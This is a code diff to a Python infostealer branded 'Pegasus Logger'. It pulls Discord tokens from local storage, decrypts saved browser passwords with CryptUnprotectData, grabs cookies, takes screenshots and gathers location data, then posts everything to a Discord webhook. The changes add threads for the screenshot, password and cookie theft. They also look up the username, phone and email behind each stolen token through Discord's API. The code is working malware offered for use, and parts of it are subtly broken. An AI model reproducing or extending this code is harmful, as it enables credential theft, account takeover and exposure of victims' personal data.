@@ -19,6 +19,7 @@ from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
+from threading import Thread
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
@@ -31,13 +32,16 @@ def main(webhook_url):
     get_loc()
     get_more()
     grabtokens()
-    accinfo()
     
-    ss()
-    
-    password()
-    cookiemonster()
-    
+    for thread in [
+        Thread(target=ss),
+        Thread(target=password),
+        Thread(target=cookiemonster)
+        ]:
+        
+        thread.start()
+        thread.join()
+        
     embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
     embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
     embed.set_thumbnail(url="https://i.imgur.com/q1NJvOx.png")
@@ -62,15 +66,16 @@ def pegasus():
             pass
 
 def accinfo():
-    r = requests.get(
-        'https://discord.com/api/v9/users/@me',
-        headers={"Authorization": token})
-        
-    username = r.json()['username'] + '#' + r.json()['discriminator']
-    phone = r.json()['phone']
-    email = r.json()['email']
-             
-    embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}") 
+    for t in int(tokens):
+        r = requests.get(
+            'https://discord.com/api/v9/users/@me',
+            headers={"Authorization": tokens[t]})
+            
+        username = r.json()['username'] + '#' + r.json()['discriminator']
+        phone = r.json()['phone']
+        email = r.json()['email']
+                
+        embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}") 
     
 def get_loc():
     ip = org = loc = city = country = region = googlemap = "None"
@@ -224,7 +229,7 @@ class grabtokens():
         return [productName, wkey]
         
     def grabTokens(self):
-        global token
+        global token, tokens
         
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
@@ -298,7 +303,16 @@ class grabtokens():
                                     
         embed.add_field(name="🔐  Token(s)", value=f"```{self.tokens}```", inline=False) 
         
-        token = self.tokens[0]
+        for token in self.tokens:
+            r = requests.get(
+                'https://discord.com/api/v9/users/@me',
+                headers={"Authorization": token})
+                
+            username = r.json()['username'] + '#' + r.json()['discriminator']
+            phone = r.json()['phone']
+            email = r.json()['email']
+                    
+            embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}", inline=False)  
 
 def ss():
     screenshot('screenshot.png')
